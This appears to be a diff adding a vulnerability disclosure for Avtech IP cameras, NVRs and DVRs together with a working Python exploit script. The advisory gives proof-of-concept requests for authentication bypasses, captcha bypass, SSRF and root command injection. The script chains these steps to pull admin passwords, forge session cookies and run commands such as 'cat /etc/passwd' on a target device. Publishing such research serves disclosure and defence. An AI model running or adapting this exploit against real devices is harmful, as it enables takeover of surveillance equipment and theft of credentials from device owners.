@@ -1,0 +1,485 @@
+'''
+Avtech devices multiple vulnerabilities
+--------------------------------------------------
+
+Platforms / Firmware confirmed affected:
+- Every Avtech device (IP camera, NVR, DVR) and firmware version. [4]
+contains the list of confirmed firmware versions, which are affected.
+- Product page: http://www.avtech.com.tw/
+
+ôAVTECH, founded in 1996, is one of the worldÆs leading CCTV
+manufacturers. With stably increasing revenue and practical business
+running philosophy, AVTECH has been ranked as the largest public-listed
+company among the Taiwan surveillance industry. AVTECH makes every
+effort on the innovation of technology, product and implementation.
+Based on years of research and industry experience, AVTECH has obtained
+a leading position on mobile platform support and provides a full range
+of surveillance products.ö
+
+Avtech is the second most popular search term in Shodan. According to
+Shodan, more than 130.000 Avtech devices are exposed to the internet.
+
+Vulnerabilities
+---------------
+1) Plaintext storage of administrative password
+Every user password is stored in clear text. An attacker with access to
+the device itself can easily obtain the full list of passwords. By
+exploiting command injection or authentication bypass issues, the clear
+text admin password can be retrieved.
+
+2) Missing CSRF protection
+The web interface does not use any CSRF protection. If a valid session
+exists for the user, the attacker can modify all settings of the device
+via CSRF. If there is no valid session, but the user did not change the
+default admin password, the attacker can log in as admin via CSRF as well.
+
+3) Unauthenticated information disclosure
+Under the /cgi-bin/nobody folder every CGI script can be accessed
+without authentication.
+POC: GET /cgi-bin/nobody/Machine.cgi?action=get_capability
+Example response:
+Firmware.Version=1011-1005-1008-1002
+MACAddress=00:0E:53:xx:xx:xx
+Product.Type=DVR
+Product.ID=308B
+Product.ShortName=V_full_Indep,V_Multistream
+Video.System=PAL
+Audio.DownloadFormat=ULAW
+Video.Input.Num=8
+Video.Output.Num=1
+Video.Format=H264,MJPEG
+Video.Format.Default=H264
+Video.Resolution=4CIF,CIF
+Video.Quality=BEST,HIGH,NORMAL,BASIC
+Video.Local.Input.Num=8
+Video.Local.Output.Num=1
+Video.Local.Format=H264,MJPEG
+Audio.Input.Num=8
+Audio.Output.Num=1
+Audio.Format=ULAW
+Audio.Local.Input.Num=8
+Audio.Local.Output.Num=1
+Audio.Local.Format=PCM
+Language.Default=ENGLISH
+Language.Support=ENGLISH&CHINESE&JAPANESE&FRANCE&GERMAN&SPANISH&PORTUGUESE&ITALIAN&TURKISH&POLISH&RUSSIAN&CUSTOMIZE&THAI
+&VIETNAM&DUTCH&GREEK&ARABIC&CZECH&HUNGARIAN&HEBREW&CHINA&
+Capability=D0,80,A,80
+PushNotify.MaxChannel=8
+
+4) Unauthenticated SSRF in DVR devices
+In case of DVR devices, Search.cgi can be accessed without
+authentication. This service is responsible for searching and accessing
+IP cameras in the local network. In newer firmware versions, Search.cgi
+provides the cgi_query action, which performs an HTTP request with the
+specified parameters. By modifying the ip, port and queryb64str
+parameters, an attacker is able to perform arbitrary HTTP requests
+through the DVR device without authentication.
+POC:
+http://<device_ip>/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==
+
+5) Unauthenticated command injection in DVR devices
+The cgi_query action in Search.cgi performs HTML requests with the wget
+system command, which uses the received parameters without sanitization
+or verification. By exploiting this issue, an attacker can execute any
+system command with root privileges without authentication.
+POC:
+http://<device_ip>/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=LW==&username=admin%20;XmlAp%20r%20Account.User1.Password>$(ps|grep%20Search.cgi|grep%20-v%20grep|head%20-n%201|awk%20'{print%20"/tmp/"$1".log"}');&password=admin
+
+6) Authentication bypass #1
+Video player plugins are stored as .cab files in the web root, which can
+be accessed and downloaded without authentication. The cab file request
+verification in the streamd web server is performed with the strstr
+function, which means that a request should not be authenticated if it
+contains the ô.cabö string anywhere in the URL. We note that some of the
+models contain an additional check in the CgiDaemon, which allows
+unauthenticated cgi access only under the /cgi-bin/nobody folder.
+POC:
+http://<device_ip>/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*
+
+7) Authentication bypass #2
+Cgi scripts in the /cgi-bin/nobody folder can be accessed without
+authentication (e.g. for login). The streamd web server verifies whether
+the request can be performed without authentication by searching for the
+ô/nobodyö string in the URL with  the strstr function. Thus, if a
+request contains the "/nobody" string anywhere in the URL, it does not
+have to be authenticated. We note that some of the models contain an
+additional check in the CgiDaemon, which allows unauthenticated cgi
+access only under the /cgi-bin/nobody folder.
+POC:
+http://<device_ip>/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*
+
+8) Unauthenticated file download from web root
+If a cab file is requested, the web server sends the file without
+processing it. Because the streamd web server verifies the cab file
+request by searching for the ô.cabö string in the URL with the strstr
+function, any file (even the cgi scripts) in the web root can be
+downloaded without authentication.
+POC: http://<device_ip>/cgi-bin/cgibox?.cab
+
+9) Login captcha bypass #1
+To prevent brute-forcing attempts, Avtech devices require a captcha for
+login requests. However, if the login requests contain the login=quick
+parameter, the captcha verification is bypassed.
+POC:
+http://<device_ip>/cgi-bin/nobody/VerifyCode.cgi?account=<b64(username:password)>&login=quick
+
+10) Login captcha bypass #2
+Instead of using a random session ID, Avtech devices use the
+base64-encoded username and password as the Cookie value. Since the IP
+address of the logged in user is not stored, if an attacker sets the
+Cookie manually, the captcha verification can by bypassed easily.
+
+11) Authenticated command injection in CloudSetup.cgi
+Devices that support the Avtech cloud contain CloudSetup.cgi, which can
+be accessed after authentication. The exefile parameter of a
+CloudSetup.cgi request specifies the system command to be executed.
+Since there is no verification or white list-based checking of the
+exefile parameter, an attacker can execute arbitrary system commands
+with root privileges.
+POC: http://<device_ip>/cgi-bin/supervisor/CloudSetup.cgi?exefile=ps
+
+12) Authenticated command injection in adcommand.cgi
+Some of the Avtech devices contain adcommand.cgi to perform ActionD
+commands. The adcommand.cgi can be accessed after authentication. In
+newer devices the ActionD daemon provides the DoShellCmd function, which
+performs a system call with the specified parameters. Since there is no
+verification or white list-based checking of the parameter of the
+DoShellCmd function, an attacker can execute arbitrary system commands
+with root privileges.
+POC:
+POST /cgi-bin/supervisor/adcommand.cgi HTTP/1.1
+Host: <device_ip>
+Content-Length: 23
+Cookie: SSID=YWRtaW46YWRtaW4=
+
+DoShellCmd "strCmd=ps&"
+
+13) Authenticated command injection in PwdGrp.cgi
+The PwdGrp.cgi uses the username, password and group parameters in a new
+user creation or modification request in a system command without
+validation or sanitization. Thus and attacker can execute arbitrary
+system commands with root privileges.
+We are aware that this vulnerability is being exploited in the wild!
+POC:
+http://<device_ip>/cgi-bin/supervisor/PwdGrp.cgi?action=add&user=test&pwd=;reboot;&grp=SUPERVISOR&lifetime=5%20MIN
+
+14) HTTPS used without certificate verification
+The SyncCloudAccount.sh, QueryFromClient.sh and SyncPermit.sh scripts
+use wget to access HTTPS sites, such as https://payment.eagleeyes.tw, by
+specifying the no-check-certificate parameter. Thus wget skips server
+certificate verification and a MITM attack is possible against the HTTPS
+communication.
+
+Timeline
+2015.10.19: First attempt to contact with Avtech, but we did not receive
+any response
+2016.05.24: Second attempt to contact Avtech without any response
+2016.05.27: Third attempt to contact Avtech by sending e-mail to public
+Avtech e-mail addresses. We did not receive any response.
+2016.xx.xx: Full disclosure
+
+POC
+---
+POC script is available to demonstrate the following problems [3]:
+- Unauthenticated information leakage (capabilities)
+- Authentication bypass (.cab, nobody)
+- Unauthenticated SSRF on DVR devices
+- Unauthenticated command injection on DVR devices
+- Login captcha bypass with login=quick or manual cookie creation
+- CloudSetup.cgi command injection after authentication
+- adcommand.cgi command injection after authentication
+
+A video demonstration is also available [1], which presents some of the
+above problems.
+
+Recommendations
+---------------
+Unfortunately there is no solution available for these vulnerabilities
+at the moment. You can take the following steps to protect your device:
+- Change the default admin password
+- Never expose the web interface of any Avtech device to the internet
+
+We note that the above vulnerabilities were found within a short period
+of time without a systematic approach. Based on the vulnerability types
+we found and the overall code quality, the devices should contain much
+more problems.
+
+Credits
+-------
+This vulnerability was discovered and researched by Gergely Eberhardt
+(@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
+
+References
+----------
+[1]
+https://www.search-lab.hu/advisories/126-avtech-devices-multiple-vulnerabilities
+<http://www.search-lab.hu/advisories/126-avtech-devices-multiple-vulnerabilities>
+[2] https://youtu.be/BUx8nLlIMxI
+[3] https://github.com/ebux/AVTECH
+[4] http://www.search-lab.hu/media/vulnerability_matrix.txt
+'''
+
+#
+# POC code for Technicolor Avtech devices
+#
+# Demonstrates the following vulnerabilities
+#  - Unauthenticated information leakage (capabilities)
+#  - Authentication bypass (.cab, nobody)
+#  - Unauthenticated SSRF on DVR devices
+#  - Unauthenticated command injection on DVR devices
+#  - Login captcha bypass with login=quick or manual cookie creation
+#  - CloudSetup.cgi command injection after authentication
+#  - adcommand.cgi command injection after authentication
+#
+# Credit: Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
+#
+# Advisory: http://search-lab.hu/...
+
+import sys
+import requests
+import base64
+
+class avtech:
+    AVTECH_BYP_NONE = 0
+    AVTECH_BYP_CAB = 1
+    AVTECH_BYP_NOBODY = 2
+
+    def __init__(self, addr, port):
+        self.addr = addr
+        self.port = port
+        self.s = requests.Session()
+        self.auth = False
+        self.authbyp_str = {self.AVTECH_BYP_NONE:'', self.AVTECH_BYP_CAB:'.cab&', self.AVTECH_BYP_NOBODY:'/nobody&'}
+        self.authbyp = self.AVTECH_BYP_NONE
+        self.username = ''
+        self.password = ''
+
+        self.cabbyp = False
+        self.nobodybyp = False
+        self.firmware_version = ''
+        self.product_type = ''
+        self.product_id = ''
+        self.mac_address = ''
+
+    def getUri(self, uri, param, bypass=False):
+        if (bypass):
+            return 'http://%s:%d/%s?%s%s'%(self.addr, self.port, uri, self.authbyp_str[self.authbyp], param)
+        else:
+            return 'http://%s:%d/%s?%s'%(self.addr, self.port, uri, param)
+
+    def setPwd(self, usr, pwd):
+        self.username = usr
+        self.password = pwd
+
+    # creates a valid cookie without logging in
+    def setCookie(self):
+        self.s.cookies['SSID'] = base64.b64encode('%s:%s'%(self.username,self.password))
+        self.auth = True
+
+    # performs authentication with the provided user name and password using
+    # the login=quick parameter, which bypass the captcha verification
+    def login(self):
+        self.s = requests.Session()
+        r = self.s.get(self.getUri('/cgi-bin/nobody/VerifyCode.cgi', 'account=%s&login=quick'%(base64.b64encode('%s:%s'%(self.username,self.password)))))
+        res = r.text.split()
+        if (int(res[0]) == -35):
+            #print 'Authentication failed with %s:%s'%(self.username,self.password)
+            return False
+        if (int(res[0]) == 0):
+            #print 'Authentication succeeded with %s:%s'%(self.username,self.password)
+            self.auth = True
+            return True
+        #else:
+        #    print 'Unknown response code: %d'%(int(res[0]))
+        return False
+
+    # verifies whether the authentication bypass is working .cab or /nobody problem
+    def checkBypass(self):
+        if (self.auth):
+            return 'Session is already authenticated, you do not have to bypass!'
+        ret = ''
+        greq = '&action=get&category=Account.*'
+        # .cab check
+        try:
+            r = self.s.get(self.getUri('/cgi-bin/user/Config.cgi','.cab%s'%(greq)))
+            if (len(r.text) > 0 and r.text[0] == '0'):
+                ret += '.cab authentication bypass was successful, '
+                self.authbyp = self.AVTECH_BYP_CAB
+                self.cabbyp = True
+        except:
+            ret += '.cab authentication bypass was not successful, '
+
+        # /nobody check
+        try:
+            r = self.s.get(self.getUri('/cgi-bin/user/Config.cgi','/nobody%s'%(greq)))
+            if (len(r.text) > 0 and r.text[0] == '0'):
+                ret += '/nobody authentication bypass was successful'
+                self.nobodybyp = True
+                if (self.authbyp == self.AVTECH_BYP_NONE):
+                    self.authbyp = self.AVTECH_BYP_NOBODY
+        except:
+            ret += '/nobody authentication bypass was not successful'
+        return ret
+
+    # retrieves account information after authentication
+    def getAdminPwd(self):
+        r = self.s.get(self.getUri('/cgi-bin/user/Config.cgi','action=get&category=Account.*', True))
+        for l in r.text.split():
+            lp = l.split('=')
+            if (len(lp) == 2):
+                if (lp[0] == 'Account.User1.Username'):
+                    self.username = lp[1]
+                elif (lp[0] == 'Account.User1.Password'):
+                    self.password = lp[1]
+                    break
+                if (lp[0] == 'Account.User2.Username'):
+                    self.username = lp[1]
+                elif (lp[0] == 'Account.User2.Password'):
+                    self.password = lp[1]
+                    break
+                if (lp[0] == 'Account.User3.Username'):
+                    self.username = lp[1]
+                elif (lp[0] == 'Account.User3.Password'):
+                    self.password = lp[1]
+                    break
+
+    # retrieves firmware version after authentication
+    def getFwVersion(self):
+        r = self.s.get(self.getUri('/cgi-bin/user/Config.cgi','action=get&category=Properties.Firmware.*', False))
+        print r.text
+
+    # retrieves login response after authentication
+    def getLogin(self):
+        r = self.s.get(self.getUri('/cgi-bin/guest/Login.cgi','rnd=0.5', False))
+        print r.text
+
+    # CloudSetup.cgi command injection test
+    def commandInjection(self, cmd):
+        try:
+            r = self.s.get(self.getUri('/cgi-bin/supervisor/CloudSetup.cgi','exefile=%s'%(cmd), False))
+            return r.text
+        except:
+            print 'CloudSetup.cgi command injection test failed'
+
+    # adcommand.cgi command injection test
+    def commandInjection2(self, cmd):
+        data = 'DoShellCmd "strCmd=%s&"'%(cmd)
+        r = self.s.post(self.getUri('/cgi-bin/supervisor/adcommand.cgi','', False), data=data)
+        return r.text
+
+    # parses capability response
+    def parseCapability(self, cap):
+        for l in cap.split('\n'):
+            ld = l.strip().split('=')
+            if (len(ld)==2):
+                if (ld[0] == 'Firmware.Version'):
+                    self.firmware_version = ld[1]
+                elif (ld[0] == 'Product.Type'):
+                    self.product_type = ld[1]
+                elif (ld[0] == 'Product.ID'):
+                    self.product_id = ld[1]
+                elif (ld[0] == 'MACAddress'):
+                    self.mac_address = ld[1]
+
+    # unauthenticated information leakage
+    def getCapability(self):
+        r = self.s.get(self.getUri('/cgi-bin/nobody/Machine.cgi','action=get_capability', False))
+        self.parseCapability(r.text)
+        return r.text
+
+    # checks the availability of search.cgi (available only on DVR devices)
+    def checkSearch(self):
+        try:
+            r = self.s.get(self.getUri('/cgi-bin/nobody/Search.cgi','action=scan', False))
+            return r.text
+        except:
+            return ''
+
+    # unauthenticated SSRF using the search.cgi script (available only on DVR devices)
+    def checkCgiQuery(self):
+        try:
+            r = self.s.get(self.getUri('/cgi-bin/nobody/Search.cgi','action=cgi_query&ip=google.com&port=80&queryb64str=Lw==', False))
+            if (len(r.text)>=4 and r.text[0:4] == '0\nOK'):
+                return True
+            else:
+                return False
+        except:
+            return False
+
+    # unauthenticated command injection in the search.cgi script (available only on DVR devices)
+    def searchCmdInjection(self, command):
+        cmdstr = (' ;%s>$(ps|grep Search.cgi|grep -v grep|head -n 1|awk \'{print "/tmp/"$1".log"}\';)'%(command)).replace(' ', '%20')
+        uri = self.getUri('cgi-bin/nobody/Search.cgi','action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%s&password=admin'%(cmdstr),False)
+        print uri
+        r = self.s.get(uri)
+        return r.text
+
+#------------------------------------
+
+if __name__ == '__main__':
+    if (len(sys.argv) < 2):
+        print 'avtech_nas_pc.py addr [port]'
+    addr = sys.argv[1]
+    port = 80
+    if (len(sys.argv) == 3):
+        port = int(sys.argv[2])
+
+    avtech = avtech(addr, port)
+
+    # unatuhenticated information disclosure
+    cap = avtech.getCapability()
+    print cap
+    avtech.parseCapability(cap)
+    print '%s,%s,%s,%s'%(avtech.firmware_version, avtech.product_type, avtech.product_id, avtech.mac_address)
+
+    # check unauthenticated SSRF vulnerability
+    sr = avtech.checkSearch()
+    if (len(sr) > 0 and sr[0] == '0'):
+        cgi_query = avtech.checkCgiQuery()
+        if (cgi_query):
+            print 'SSRF was successful'
+        else:
+            print 'SSRF was not successful'
+
+        resp = avtech.searchCmdInjection('XmlAp r Account.User1.Username')
+        lines = resp.split('\n')
+        if (len(lines) >= 3):
+            pwd = lines[2].strip()
+            print 'User1 name: %s'%(pwd)
+            avtech.username = pwd
+
+        resp = avtech.searchCmdInjection('XmlAp r Account.User1.Password')
+        lines = resp.split('\n')
+        if (len(lines) >= 3):
+            pwd = lines[2].strip()
+            print 'User1 password: %s'%(pwd)
+            avtech.password = pwd
+
+    # authentication bypas
+    print 'Authentication bypass check'
+    print avtech.checkBypass()
+    print 'Try to get admin password'
+    print avtech.getAdminPwd()
+    default = False
+    # try default password
+    if (avtech.password == ''):
+        avtech.setPwd('admin', 'admin')
+        default = True
+    # login with credentials using captch bypass
+    avtech.login()
+    # if captch bypass was not possible, but we have a password, set cookie manually
+    if (not avtech.auth and not default and avtech.password != ''):
+        avtech.setCookie()
+
+    # check issues after authentication
+    if (avtech.auth):
+        print 'Get admin password'
+        avtech.getAdminPwd()
+        print 'Get login'
+        avtech.getLogin()
+        print 'Get fw version'
+        avtech.getFwVersion()
+        print 'cloud command injection'
+        print avtech.commandInjection('ps')
+        print 'adcommand command injection'
+        print avtech.commandInjection2('cat /etc/passwd')
